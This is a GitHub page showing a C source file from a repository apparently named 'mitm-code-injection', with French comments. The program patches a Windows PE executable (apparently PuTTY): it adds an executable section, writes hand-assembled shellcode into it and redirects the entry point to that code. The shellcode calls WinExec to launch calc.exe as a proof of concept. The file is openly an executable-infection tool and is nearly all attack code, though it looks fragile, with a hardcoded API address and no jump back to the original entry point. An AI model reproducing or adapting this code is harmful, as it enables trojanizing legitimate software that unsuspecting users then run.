Skip to content
This repository
Search
Pull requests
Issues
Gist
 @seyoh
 Sign out
 Watch 0
  Star 0
  Fork 0 seyoh/mitm-code-injection
 Code  Issues 0  Pull requests 0  Projects 0  Wiki  Pulse  Graphs  Settings
Branch: master Find file Copy pathmitm-code-injection/injection/main.c
9fa3504  on 18 Mar
@seyoh seyoh Add files via upload
1 contributor
RawBlameHistory
424 lines (335 sloc)  13.2 KB
#include <stdio.h>
#include <stdlib.h>

#include <windef.h>
//#define TAILLE_FICHIER 35101776 //bitcoin
#define TAILLE_FICHIER 531368 //putty
/*typedef struct _IMAGE_DOS_HEADER {
WORD e_magic;
WORD e_cblp;
WORD e_cp;
WORD e_crlc;
WORD e_cparhdr;
WORD e_minalloc;
WORD e_maxalloc;
WORD e_ss;
WORD e_sp;
WORD e_csum;
WORD e_ip;
WORD e_cs;
WORD e_lfarlc;
WORD e_ovno;
WORD e_res[4];
WORD e_oemid;
WORD e_oeminfo;
WORD e_res2[10];
LONG e_lfanew;
}  IMAGE_DOS_HEADER,*PIMAGE_DOS_HEADER;*/


/*typedef struct _IMAGE_NT_HEADERS {
DWORD                 Signature;
IMAGE_FILE_HEADER     FileHeader;
IMAGE_OPTIONAL_HEADER OptionalHeader;
}IMAGE_NT_HEADERS, *PIMAGE_NT_HEADERS;
*/

/*typedef struct _IMAGE_FILE_HEADER {
WORD  Machine;
WORD  NumberOfSections;
DWORD TimeDateStamp;
DWORD PointerToSymbolTable;
DWORD NumberOfSymbols;
WORD  SizeOfOptionalHeader;
WORD  Characteristics;
}IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;
*/
//fonctions
PIMAGE_DOS_HEADER GetDOSHeader(HANDLE hBinary)
{
       PIMAGE_DOS_HEADER pDOSHeader = NULL;
       pDOSHeader = (PIMAGE_DOS_HEADER) hBinary;
//Récupération de l'entête DOS
return pDOSHeader;
}

PIMAGE_NT_HEADERS GetPEHeader(HANDLE hBinary)
{
       PIMAGE_DOS_HEADER pDOSHeader = NULL;
       PIMAGE_NT_HEADERS pPEHeader = NULL;
       pDOSHeader = GetDOSHeader(hBinary);
       pPEHeader = (PIMAGE_NT_HEADERS) ((PUCHAR)pDOSHeader + pDOSHeader->e_lfanew);
//Récupération de l'entête PE
return pPEHeader;
}

PIMAGE_FILE_HEADER GetCOFFHeader(HANDLE hBinary)
{
       PIMAGE_NT_HEADERS pPEHeader = NULL;
       PIMAGE_FILE_HEADER pCOFFHeader = NULL;
       pPEHeader = GetPEHeader(hBinary);
       pCOFFHeader = (PIMAGE_FILE_HEADER)&pPEHeader->FileHeader;
//Récupération de l'entête COFF
return pCOFFHeader;
}

PIMAGE_OPTIONAL_HEADER GetOptionalHeader(HANDLE hBinary)
{
       PIMAGE_NT_HEADERS pPEHeader = NULL;
       PIMAGE_OPTIONAL_HEADER pOptionalHeader = NULL;
       pPEHeader = GetPEHeader(hBinary);
       pOptionalHeader = (PIMAGE_OPTIONAL_HEADER)&pPEHeader->OptionalHeader;
//Récupération de l'entête Optional
return pOptionalHeader;
}

PIMAGE_SECTION_HEADER GetSectionHeader(HANDLE hBinary)
{
       PIMAGE_NT_HEADERS pPEHeader = NULL;
       PIMAGE_SECTION_HEADER pSectionHeader = NULL;
       pPEHeader = GetPEHeader(hBinary);
       pSectionHeader = (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(pPEHeader);
return pSectionHeader;
}

VOID  ListSections(HANDLE hBinary)
{
     PIMAGE_SECTION_HEADER pSectionHeader = NULL;
     PIMAGE_FILE_HEADER pCOFFHeader = NULL;
     size_t i;
     pSectionHeader = (PIMAGE_SECTION_HEADER)GetSectionHeader(hBinary);
     pCOFFHeader = (PIMAGE_FILE_HEADER)GetCOFFHeader(hBinary);
     printf("\n[+]Sections");
for(i  = 0; i < pCOFFHeader->NumberOfSections; i++)
{
           printf("\n     %s", pSectionHeader[i].Name);
printf(" \n            VirtualSize : 0x%x", pSectionHeader[i].Misc.VirtualSize);
printf(" \n            Virtual Address : 0x%x", pSectionHeader[i].VirtualAddress);
printf(" \n            SizeOfRawData : 0x%x", pSectionHeader[i].SizeOfRawData);
printf(" \n            PointerToRawData : 0x%x", pSectionHeader[i].PointerToRawData);
printf(" \n            PointerToRelocations : 0x%x",pSectionHeader[i].PointerToRelocations);
printf(" \n            PointerToLinenumbers : 0x%x",pSectionHeader[i].PointerToLinenumbers);
printf(" \n            NumberOfRelocations : 0x%x",pSectionHeader[i].NumberOfRelocations);
printf(" \n            NumberOfLinenumbers : 0x%x",pSectionHeader[i].NumberOfLinenumbers);
printf(" \n            Attributes : 0x%x", pSectionHeader[i].Characteristics);
}



}

//pas du tout sur que ce soit juste!!!! retourne l'arrondie de size en multiple de alignment
DWORD GetAlignment(DWORD size, DWORD alignment)
{
    DWORD reste=size%alignment;
    if(reste==0)
        return size;
    else
        return size + alignment - reste;

}

//fonction pour ajouter une section
VOID  AddLPSection(HANDLE hBinary,char* loader)
{
     PIMAGE_SECTION_HEADER pNewSectionHeader = NULL;
     PIMAGE_SECTION_HEADER pSectionHeader = NULL;
     PIMAGE_FILE_HEADER pCOFFHeader = NULL;
     PIMAGE_OPTIONAL_HEADER pOptionalHeader = NULL;

     DWORD dwSectionSize, dwSectionAlignment, dwFileAlignment;
     pCOFFHeader = GetCOFFHeader(hBinary);
     pSectionHeader = GetSectionHeader(hBinary);
     pOptionalHeader = GetOptionalHeader(hBinary);

     dwSectionSize =sizeof(loader)+sizeof(DWORD)+1;
     dwSectionAlignment = pOptionalHeader->SectionAlignment;
     dwFileAlignment = pOptionalHeader->FileAlignment;
     pNewSectionHeader = (PIMAGE_SECTION_HEADER) ((PUCHAR)(&pSectionHeader[pCOFFHeader->NumberOfSections-1].Characteristics) + 0x4);
     printf("\n[+]Adding section .shtot at address 0x%x ...\n", (char*)pNewSectionHeader-(char*)hBinary);
     memcpy(*(&pNewSectionHeader->Name), ".shtot", 6);

     *(&pNewSectionHeader->VirtualAddress) =GetAlignment(pSectionHeader[pCOFFHeader->NumberOfSections-1].VirtualAddress +pSectionHeader[pCOFFHeader->NumberOfSections-1].Misc.VirtualSize,dwSectionAlignment);
     *(&pNewSectionHeader->Misc.VirtualSize) = GetAlignment(dwSectionSize,dwSectionAlignment);
     *(&pNewSectionHeader->SizeOfRawData) = GetAlignment(dwSectionSize,dwFileAlignment);
     *(&pNewSectionHeader->PointerToRawData) =GetAlignment(pSectionHeader[pCOFFHeader->NumberOfSections-1].PointerToRawData + pSectionHeader[pCOFFHeader->NumberOfSections-1].SizeOfRawData, dwFileAlignment);
     *(&pNewSectionHeader->Characteristics) = IMAGE_SCN_MEM_EXECUTE |IMAGE_SCN_MEM_READ | IMAGE_SCN_CNT_CODE;
     *(&pNewSectionHeader->PointerToRelocations) = 0x0;
     *(&pNewSectionHeader->PointerToLinenumbers) = 0x0;
     *(&pNewSectionHeader->NumberOfRelocations) = 0x0;
     *(&pNewSectionHeader->NumberOfLinenumbers) = 0x0;
//Champs à ne pas oublier
     *(&pCOFFHeader->NumberOfSections) += 0x1;
     *(&pOptionalHeader->SizeOfImage) = GetAlignment(pOptionalHeader->SizeOfImage+dwSectionSize, dwSectionAlignment);

     //*(&pOptionalHeader->SizeOfHeaders) = GetAlignment(pOptionalHeader->SizeOfHeaders + sizeof(IMAGE_SECTION_HEADER), dwFileAlignment); //ancienne ligne

     DWORD tailleHeaders=sizeof(IMAGE_FILE_HEADER)+sizeof(IMAGE_OPTIONAL_HEADER)+(pCOFFHeader->NumberOfSections)*sizeof(IMAGE_SECTION_HEADER);
     *(&pOptionalHeader->SizeOfHeaders) = GetAlignment(tailleHeaders, dwFileAlignment);
     printf("size of header apres:%d\n",tailleHeaders-sizeof(IMAGE_SECTION_HEADER));
     printf("OK\n");
return;
}

PDWORD GetSectionAddress(HANDLE hBinary, PUCHAR pSectionName)
{
     PIMAGE_SECTION_HEADER pSectionHeader = NULL;
     PIMAGE_FILE_HEADER pCOFFHeader = NULL;
     size_t i;
     pSectionHeader = (PIMAGE_SECTION_HEADER)GetSectionHeader(hBinary);
     pCOFFHeader = (PIMAGE_FILE_HEADER)GetCOFFHeader(hBinary);
for
(i  = 0; i < pCOFFHeader->NumberOfSections; i++)
{
    if(!strcmp(pSectionHeader[i].Name, pSectionName))
        return (PDWORD)((PUCHAR)hBinary + pSectionHeader[i].PointerToRawData);
}
return 0x0;
}

BYTE WriteInSection(HANDLE hBinary, PUCHAR pSectionName, PUCHAR pBuf, UINT  size)
{
     PDWORD pSectionAddress = NULL;
     pSectionAddress = GetSectionAddress(hBinary, pSectionName);
    if(pSectionAddress == 0x0)
        return 0x0;
    memcpy(pSectionAddress, pBuf, size);
    return 0x1;
}



HANDLE lecture_fichier(char* nom,int* tailleFichier,int marge)
{
    FILE* fichier;
    fichier = fopen(nom,"rb");

    //recherche taille
    fseek(fichier, 0L, SEEK_END);
    int taille = ftell(fichier);
    *tailleFichier=taille;
    rewind(fichier);

    char* chaine=(char*)malloc(taille+marge);
    fread(chaine,taille,1,fichier);
    fclose(fichier);
    return (HANDLE)chaine;
}

void ecriture_fichier(char* nom,HANDLE binaire,int taille)
{
    FILE* fichier;
    fichier = fopen(nom,"wb+");
    fwrite(binaire,taille,1,fichier);
    fclose(fichier);

}




void Decaler(HANDLE binaire,int offset,int taille,int tailleFichier)
//binaire doit avoir alloué assez de place
{
    int tailleReste= tailleFichier - offset;

    char* temp=(char*)malloc(tailleReste);

    memcpy(temp,&binaire[offset],tailleReste);

    memcpy(&binaire[offset+taille],temp,tailleReste);
    //on rempli par des 0
    memset(&binaire[offset],0,taille);
    free(temp);

}


int  decaler_donnee(HANDLE binaire,int decalage,int tailleFichier) //pour ajouter l'entree dans la table
{

     PIMAGE_SECTION_HEADER pSectionHeader = NULL;
     PIMAGE_FILE_HEADER pCOFFHeader = NULL;
     PIMAGE_OPTIONAL_HEADER pOptionalHeader = NULL;


     pCOFFHeader = GetCOFFHeader(binaire);
     pSectionHeader = GetSectionHeader(binaire);
     pOptionalHeader = GetOptionalHeader(binaire);
     decalage=GetAlignment(decalage, pOptionalHeader->FileAlignment);

    int offset=(char*)(&pSectionHeader[pCOFFHeader->NumberOfSections-1].Characteristics) + 0x4 - (char*)binaire;
    Decaler(binaire,offset,decalage,tailleFichier);

     int i;
     //on change les adresse physique des fichiers
     for(i=0;i<pCOFFHeader->NumberOfSections;i++)
     {
         pSectionHeader[i].PointerToRawData += (pOptionalHeader->FileAlignment);
     }

     return tailleFichier + decalage;

}


int decaler_ajout_section(HANDLE binaire,int decalage,int tailleFichier)
{
    PIMAGE_OPTIONAL_HEADER pOptionalHeader = GetOptionalHeader(binaire);
    PIMAGE_SECTION_HEADER pSectionHeader = GetSectionHeader(binaire);
    PIMAGE_FILE_HEADER pCOFFHeader = pCOFFHeader=GetCOFFHeader(binaire);
    int newSectionAddress;

    DWORD newSection = 0;
    int offset=pSectionHeader[pCOFFHeader->NumberOfSections-1].PointerToRawData;
    decalage=GetAlignment(decalage, pOptionalHeader->FileAlignment);
    Decaler(binaire,offset,decalage,tailleFichier);

    return tailleFichier+decalage;

}


PDWORD GetSectionVirtualAddress(HANDLE hBinary, PUCHAR pSectionName)
{
     PIMAGE_SECTION_HEADER pSectionHeader = NULL;
     PIMAGE_FILE_HEADER pCOFFHeader = NULL;
     size_t i;
     pSectionHeader = (PIMAGE_SECTION_HEADER)GetSectionHeader(hBinary);
     pCOFFHeader = (PIMAGE_FILE_HEADER)GetCOFFHeader(hBinary);
for(i  = 0; i < pCOFFHeader->NumberOfSections; i++)
{

    if (!strcmp(pSectionHeader[i].Name, pSectionName))
    {

        return (PDWORD)pSectionHeader[i].VirtualAddress;
    }

}
return 0x0;
}

VOID  RedirectEntryPoint(HANDLE hBinary,char* nomSection)
{
     PDWORD pSectionVirtualAddress = NULL;
     PIMAGE_OPTIONAL_HEADER pOptionalHeader = NULL;
     printf("\n[+]Redirecting Entry Point...\n");
     pSectionVirtualAddress = GetSectionVirtualAddress(hBinary,nomSection ); //verifier non null
     pOptionalHeader = GetOptionalHeader(hBinary);

     *(&pOptionalHeader->AddressOfEntryPoint)  = pSectionVirtualAddress;

}

DWORD GetEntryPoint(binaire)
{
    PIMAGE_OPTIONAL_HEADER pOptionalHeader = GetOptionalHeader(binaire);
    return pOptionalHeader->AddressOfEntryPoint;
}


void ListDataDirectory(HANDLE binaire)
{
    PIMAGE_OPTIONAL_HEADER pOptionalHeader= GetOptionalHeader(binaire) ;
    int nb_import = pOptionalHeader->NumberOfRvaAndSizes;
    int i;
    printf("data_directory\n");
    for(i=0;i<nb_import;i++)
    {
        printf("             size : 0x%x\n",pOptionalHeader->DataDirectory[i].Size);
        printf("             VirtualAddress : 0x%x\n", pOptionalHeader->DataDirectory[i].VirtualAddress);
    }

}

void test(HANDLE binaire)
{
         PIMAGE_SECTION_HEADER pSectionHeader = NULL;
     PIMAGE_FILE_HEADER pCOFFHeader = NULL;
     PIMAGE_OPTIONAL_HEADER pOptionalHeader = NULL;


     pCOFFHeader = GetCOFFHeader(binaire);
     pSectionHeader = GetSectionHeader(binaire);
     pOptionalHeader = GetOptionalHeader(binaire);

     //pCOFFHeader->Characteristics=259;
     //pOptionalHeader->BaseOfCode+= pOptionalHeader->FileAlignment;
     //pOptionalHeader->MinorLinkerVersion= '\x00';
     //pOptionalHeader->MajorLinkerVersion='\x08';
}

void entryPoint_to_string(char* chaine,HANDLE binaire)
{
     PIMAGE_OPTIONAL_HEADER pOptionalHeader = GetOptionalHeader(binaire);
    char address[4];//4 pour taille DWORD
    memcpy(address,&(pOptionalHeader->AddressOfEntryPoint),4);
    sprintf(chaine,"\\x%02x\\x%02x\\x%02x\\x%02x",address[0],address[1],address[2],address[3]);

}



int main()
{
char loader[]=
"\xEB\x08" //jmp 15
"\xBE\xf0\xf7\x35\x77" //mov esi adresseWinExec
"\xFF\xD6" //call esi

   // "\xB8\x2F\x38\x41\x00"//0xB8,0x2F,0x38,0x01,0x00, //mov eax,79919
    //"\xFF\xE0"//           JMP EAX

"\xC3" //ret
"\x31\xC0" //xor eax,eax
"\x50" //push eax

"\xE8\xF0\xFF\xFF\xFF" //call -5


//chaine "chemin vers calculatrice"
"\x43"
"\x3A\x5C\x57\x49"
"\x4E"
"\x44"
"\x4F"
"\x57"
"\x53\x5C\x73"
"\x79\x73\x74\x65\x6D\x33\x32\x5C\x63\x61\x6C\x63\x2E\x65\x78\x65\x00"
    //"\xB8\x2F\x38\x41\x00"//0xB8,0x2F,0x38,0x01,0x00, //mov eax,79919
    //"\xFF\xE0"//           JMP EAX
; //a faire: calculer valeur retour



/*char loader[]=
 "\xB8\x2F\x38\x41\x00"//0xB8,0x2F,0x38,0x01,0x00, //mov eax,79919
    "\xFF\xE0"//           JMP EAX
;*/

//79919 ou en hex: 01 38 2f
int tailleFichier;
HANDLE binaire = lecture_fichier("fichier.exe",&tailleFichier,10000);// a faire: calculer marge

//test(binaire);
//tailleFichier=decaler_donnee(binaire,100,tailleFichier);

AddLPSection(binaire,loader);
//ListSections(binaire);
tailleFichier=decaler_ajout_section(binaire,sizeof(loader),tailleFichier);

WriteInSection(binaire,".shtot",loader,sizeof(loader));
RedirectEntryPoint(binaire,".shtot");


ecriture_fichier("res.exe",binaire,tailleFichier);
free(binaire);

}



Contact GitHub API Training Shop Blog About
© 2017 GitHub, Inc. Terms Privacy Security Status Help
